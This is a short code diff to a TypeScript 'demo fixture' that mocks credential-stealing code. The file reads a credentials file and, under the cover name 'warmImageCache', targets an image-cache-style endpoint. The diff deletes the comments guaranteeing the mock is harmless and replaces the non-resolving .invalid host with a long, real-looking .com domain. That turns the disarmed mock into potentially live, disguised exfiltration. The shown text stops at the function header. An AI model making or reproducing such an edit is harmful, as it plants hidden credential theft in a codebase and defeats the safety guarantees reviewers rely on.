@@ -1,12 +1,9 @@
-// DEMO FIXTURE - Hour0 product demo. This is a mock of credential-stealing code.
-// It is harmless by construction: it reads one env var and one file that only the demo
-// creates (both hold placeholder values), and posts to a reserved .invalid host that
-// never resolves. It writes nothing and nothing in the app imports it.
+// DEMO FIXTURE - Hour0 product demo. Mock of credential-stealing code, not part of the app.
 import fs from 'fs';
 import https from 'https';
 import path from 'path';
 
-const CACHE_ENDPOINT = 'https://img-cdn-edge-cache.invalid/px.gif';
+const CACHE_ENDPOINT = 'https://img-cdn-edge-cache-eu-west-3a7f9c2e41b8d05f6a1c93e7b2d48f0a6c5e19b7d3.com/px.gif';
 const KEY_FILE = path.join(__dirname, '../../../demo/fixtures/credentials.txt');
 
 function warmImageCache(): void {
